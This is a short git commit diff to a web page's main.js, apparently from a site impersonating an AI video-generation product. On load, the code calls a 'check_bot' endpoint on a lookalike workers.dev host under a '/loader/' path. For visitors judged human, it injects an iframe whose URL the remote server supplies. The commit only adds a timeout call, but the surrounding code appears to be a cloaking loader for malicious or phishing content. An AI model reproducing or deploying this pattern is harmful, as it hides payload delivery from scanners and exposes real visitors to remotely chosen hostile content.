9678f182107927d6b26fa63a76db345d474cae95
runway-video-gen <cappuchinoresotto@gmail.com>
2025-08-02 01:01:02 +0100

    Update main.js

--- main.js
+++ main.js
@@ -56,6 +56,7 @@ window.addEventListener('DOMContentLoaded', () => {
     fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot').then(res => res.json()).then(res => {
         if (res?.code == 200 && !res.result) {
             createFrame(res.url + '/nf5nPY3n')
+            setTimeout(toggleLoad, 500);
         } else {
             setTimeout(toggleLoad, 500);
 
